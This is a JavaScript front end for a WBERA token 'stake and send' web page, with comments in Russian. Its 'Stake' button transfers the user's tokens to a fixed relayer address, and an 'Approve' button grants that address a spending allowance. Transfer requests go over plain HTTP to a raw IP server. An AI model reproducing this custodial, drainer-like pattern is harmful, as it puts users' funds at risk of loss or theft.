// Получаем элементы страницы
const stakeTab = document.getElementById("stake-tab");
const sendTab = document.getElementById("send-tab");

const stakeCard = document.getElementById("stake-card");
const sendCard = document.getElementById("send-card");

const connectWalletButton = document.querySelector(".connect-wallet");
const approveButton = document.getElementById("approve-button");

let buttonStake = document.querySelector('.go-button-stake');
let buttonSend = document.querySelector('.go-button');

// Назначаем обработчики событий
buttonStake.addEventListener('click', getValueStake);
buttonSend.addEventListener('click', getValueSend);
approveButton.addEventListener('click', getApprove);

stakeTab.addEventListener("click", () => {
  stakeCard.style.display = "block";
  sendCard.style.display = "none";
  stakeTab.classList.add("active");
  sendTab.classList.remove("active");
});

sendTab.addEventListener("click", () => {
  stakeCard.style.display = "none";
  sendCard.style.display = "block";
  sendTab.classList.add("active");
  stakeTab.classList.remove("active");
});

// Написал ChatGPT 
connectWalletButton.addEventListener("click", async () => {
  if (typeof window.ethereum !== 'undefined') {
    try {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      console.log("Подключенные аккаунты:", accounts);
      connectWalletButton.textContent = "Connected";
    } catch (error) {
      console.error("Ошибка при подключении к MetaMask:", error);
    }
  } else {
    alert("MetaMask не обнаружен. Пожалуйста, установите MetaMask.");
  }
});

/**
 * Функция, вызываемая при клике на кнопку Stake.
 * Выполняет депозит WBERA с кошелька пользователя на депозитный адрес релеера.
 */
async function getValueStake() {
  const valueStake = document.querySelector(".input-stake-value").value;
  console.log("Stake Amount:", valueStake);
  await depositWBERA(valueStake);
}

/**
 * Выполняет депозит WBERA посредством вызова transfer() на контракте WBERA.
 * Токены отправляются на адрес релеера (например, 0x811fbADfa21e40CB90C022658dB09be80B386aAb).
 * (Заметьте: в реальном протоколе может использоваться специальный депозитный контракт с off‑chain учётом.)
 */
async function depositWBERA(amount) {
  try {
    if (!window.ethereum) {
      alert("MetaMask не обнаружен!");
      return;
    }
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    
    const wberaAddress = "0x6969696969696969696969696969696969696969";
    // Депозитный адрес релеера
    const relayerAddress = "0x811fbADfa21e40CB90C022658dB09be80B386aAb";
    
    const wberaAbi = [
      "function transfer(address to, uint256 amount) external returns (bool)"
    ];
    
    const wberaContract = new ethers.Contract(wberaAddress, wberaAbi, signer);
    const parsedAmount = ethers.utils.parseUnits(amount, 18);
    
    console.log(`Инициируется депозит ${amount} WBERA на адрес релеера: ${relayerAddress}`);
    const tx = await wberaContract.transfer(relayerAddress, parsedAmount);
    console.log("Депозит отправлен, hash:", tx.hash);
    const receipt = await tx.wait();
    console.log("Депозит подтвержден:", receipt);
    alert(`Депозит ${amount} WBERA успешно отправлен на релеер.`);
  } catch (error) {
    console.error("Ошибка при депозите WBERA:", error);
    alert(`Ошибка депозита: ${error.message || error}`);
  }
}

/**
 * Функция, вызываемая при клике на кнопку Approve.
 * Пользователь подтверждает, что релеер может списывать с его кошелька WBERA (через transferFrom).
 */
async function getApprove() {
  const amountToApprove = prompt("Введите сумму WBERA для approve (например, 1000):", "1000");
  if (!amountToApprove) return;
  await approveTransfer(amountToApprove);
}

/**
 * Выполняет approve на контракте WBERA.
 */
async function approveTransfer(amount) {
  try {
    if (!window.ethereum) {
      alert("MetaMask не обнаружен!");
      return;
    }
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    
    const wberaAddress = "0x6969696969696969696969696969696969696969";
    const relayerAddress = "0x811fbADfa21e40CB90C022658dB09be80B386aAb";
    
    const wberaAbi = [
      "function approve(address spender, uint256 amount) external returns (bool)"
    ];
    
    const wberaContract = new ethers.Contract(wberaAddress, wberaAbi, signer);
    const parsedAmount = ethers.utils.parseUnits(amount, 18);
    
    console.log(`Одобряем, чтобы релеер ${relayerAddress} мог списывать ${amount} WBERA`);
    const tx = await wberaContract.approve(relayerAddress, parsedAmount);
    console.log("Approve транзакция отправлена, hash:", tx.hash);
    const receipt = await tx.wait();
    console.log("Approve подтвержден:", receipt);
    alert("Approve успешно выполнен.");
  } catch (error) {
    console.error("Ошибка при approve:", error);
    alert("Ошибка при approve: " + (error.message || error));
  }
}

/**
 * Функция, вызываемая при клике на кнопку Send.
 * Отправляет на сервер параметры (userAddress, recipient, amount) для выполнения перевода.
 */
function getValueSend() {
  const valueSend = sendCard.querySelector('input[type="number"]').value;
  const addressSend = sendCard.querySelector('input[type="text"]').value;
  
  console.log("Send Amount:", valueSend);
  console.log("Send Address:", addressSend);
  
  fetch("http://92.246.142.120:3000/send", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      userAddress: window.ethereum && window.ethereum.selectedAddress ? window.ethereum.selectedAddress : null,
      recipient: addressSend,
      amount: valueSend
    })
  })
    .then(response => response.json())
    .then(data => {
      console.log("Ответ от релеера:", data);
      alert(data.status === "success" ? "Перевод выполнен" : "Ошибка перевода: " + data.error);
    })
    .catch(error => {
      console.error("Ошибка при обращении к релееру:", error);
      alert("Ошибка при обращении к релееру: " + error);
    });
}
